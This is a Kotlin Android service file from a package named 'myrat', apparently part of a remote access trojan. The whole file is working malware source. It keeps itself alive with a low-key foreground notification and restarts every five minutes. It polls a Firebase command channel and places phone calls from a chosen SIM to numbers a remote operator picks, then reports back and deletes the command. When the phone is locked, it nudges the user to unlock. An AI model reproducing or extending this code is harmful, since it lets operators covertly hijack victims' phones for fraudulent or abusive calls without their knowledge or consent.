package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.LauncherActivity
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger
import com.myrat.app.worker.CallServiceRestartWorker
import java.util.concurrent.TimeUnit

class CallService : Service() {
    companion object {
        private const val CHANNEL_ID = "CallServiceChannel"
        private const val NOTIFICATION_ID = 8
    }

    private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(NOTIFICATION_ID, notification)
            scheduleRestart(this)
        } catch (e: Exception) {
            Logger.error("Failed to initialize CallService", e)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = MainActivity.getDeviceId(this)
        if (deviceId == null) {
            Logger.error("Device ID is null, stopping CallService")
            stopSelf()
            return START_NOT_STICKY
        }
        listenForCallCommands(deviceId)
        return START_STICKY
    }

    private fun scheduleRestart(context: Context) {
        try {
            val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                repeatInterval = 5, TimeUnit.MINUTES,
                flexTimeInterval = 1, TimeUnit.MINUTES
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "CallServiceRestart",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            Logger.log("Scheduled CallService restart using WorkManager")
        } catch (e: Exception) {
            Logger.error("Failed to schedule CallService restart", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Call Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Running phone call service"
                }
                val notificationManager = getSystemService(NotificationManager::class.java)
                notificationManager.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_notification_clear_all)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build foreground notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Running in background")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities != null && (
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                )
    }

    private fun listenForCallCommands(deviceId: String) {
        if (!isNetworkAvailable()) {
            Logger.error("No network available, cannot listen for call commands")
            stopSelf()
            return
        }

        val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("call_commands")

        commandsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                snapshot.children.forEach { commandSnapshot ->
                    try {
                        val command = commandSnapshot.value as? Map<*, *> ?: run {
                            Logger.error("Invalid command data for ${commandSnapshot.key}")
                            return@forEach
                        }
                        val status = command["status"] as? String
                        val simNumber = command["sim_number"] as? String
                        val recipient = command["recipient"] as? String

                        if (status != "pending") {
                            Logger.log("Skipping command ${commandSnapshot.key} with status $status")
                            return@forEach
                        }
                        if (simNumber.isNullOrBlank() || recipient.isNullOrBlank()) {
                            Logger.error("Invalid call command data for command ${commandSnapshot.key}: sim_number=$simNumber, recipient=$recipient")
                            commandSnapshot.key?.let {
                                updateCommandStatus(it, "failed", "Invalid sim_number or recipient")
                            }
                            return@forEach
                        }
                        initiateCall(simNumber, recipient, commandSnapshot.key!!)
                    } catch (e: Exception) {
                        Logger.error("Error processing command ${commandSnapshot.key}", e)
                        commandSnapshot.key?.let {
                            updateCommandStatus(it, "failed", "Processing error: ${e.message}")
                        }
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.error("Call commands database error: ${error.message}", error.toException())
            }
        })
    }

    private fun initiateCall(simNumber: String, recipient: String, commandId: String) {
        val deviceId = MainActivity.getDeviceId(this) ?: run {
            Logger.error("Device ID is null, cannot initiate call")
            updateCommandStatus(commandId, "failed", "Device ID is null")
            return
        }
        val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")

        val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
        if (alreadySentSet.contains(recipient)) {
            Logger.log("Skipping duplicate call to $recipient for command $commandId")
            return
        }

        try {
            // Check permissions
            val hasCallPhonePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.CALL_PHONE
            ) == PackageManager.PERMISSION_GRANTED
            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                Logger.error("Missing permissions: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                updateCommandStatus(commandId, "failed", "Missing required permissions")
                return
            }

            // Check if device is locked
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            if (keyguardManager.isKeyguardLocked) {
                Logger.error("Cannot initiate call: Device is locked")
                updateCommandStatus(commandId, "failed", "Device is locked")
                showUnlockNotification()
                return
            }

            // Map simNumber to subscriptionId
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
            if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                Logger.error("No active SIM subscriptions found")
                updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
                return
            }

            val slotMap = mutableMapOf<String, Int>()
            subscriptionInfoList.forEachIndexed { index, info ->
                val simSlot = "sim${index + 1}"
                slotMap[simSlot] = info.simSlotIndex
            }

            if (!slotMap.containsKey(simNumber.lowercase())) {
                Logger.error("Invalid sim_number: $simNumber, expected one of ${slotMap.keys}")
                updateCommandStatus(commandId, "failed", "Invalid sim_number: $simNumber")
                return
            }

            val simSlotIndex = slotMap[simNumber.lowercase()]!!
            val subscriptionInfo = subscriptionInfoList.find { it.simSlotIndex == simSlotIndex }
            if (subscriptionInfo == null) {
                Logger.error("No SIM found in slot $simSlotIndex for simNumber: $simNumber")
                updateCommandStatus(commandId, "failed", "No SIM found in slot $simSlotIndex")
                return
            }

            val subId = subscriptionInfo.subscriptionId
            Logger.log("Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")

            val intent = Intent(this, LauncherActivity::class.java).apply {
                action = "com.myrat.app.ACTION_MAKE_CALL"
                putExtra("recipient", recipient)
                putExtra("subId", subId)
                putExtra("simSlotIndex", simSlotIndex)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

            try {
                startActivity(intent)
                Logger.log("Initiated call from $simNumber (subId: $subId) to $recipient via LauncherActivity")
                alreadySentSet.add(recipient)
                updateCommandStatus(commandId, "success", null)
            } catch (e: ActivityNotFoundException) {
                Logger.error("Activity not found for call to $recipient", e)
                updateCommandStatus(commandId, "failed", "Activity not found")
            }
        } catch (e: SecurityException) {
            Logger.error("Permission denied for call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Logger.error("Failed to initiate call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
        }
    }

    private fun showUnlockNotification() {
        val channelId = "CallServiceAlerts"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    channelId,
                    "Call Service Alerts",
                    NotificationManager.IMPORTANCE_HIGH
                )
                val manager = getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create unlock notification channel", e)
            }
        }

        try {
            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Action Required")
                .setContentText("Please unlock your device to make a call.")
                .setSmallIcon(android.R.drawable.ic_notification_clear_all)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build()

            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(9, notification)
        } catch (e: Exception) {
            Logger.error("Failed to show unlock notification", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        val deviceId = MainActivity.getDeviceId(this) ?: return
        val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
        val updates = mutableMapOf<String, Any?>(
            "status" to status
        )
        if (error != null) {
            updates["error"] = error
        }
        commandRef.updateChildren(updates)
            .addOnSuccessListener {
                Logger.log("Updated call command $commandId to status $status")
                if (status == "success" || status == "failed") {
                    commandRef.removeValue()
                        .addOnSuccessListener {
                            Logger.log("Removed call command $commandId")
                            sentCallTracker.remove(commandId)
                        }
                        .addOnFailureListener { e ->
                            Logger.error("Failed to remove command: ${e.message}", e)
                        }
                }
            }
            .addOnFailureListener { e ->
                Logger.error("Failed to update call command $commandId: ${e.message}", e)
            }
    }
}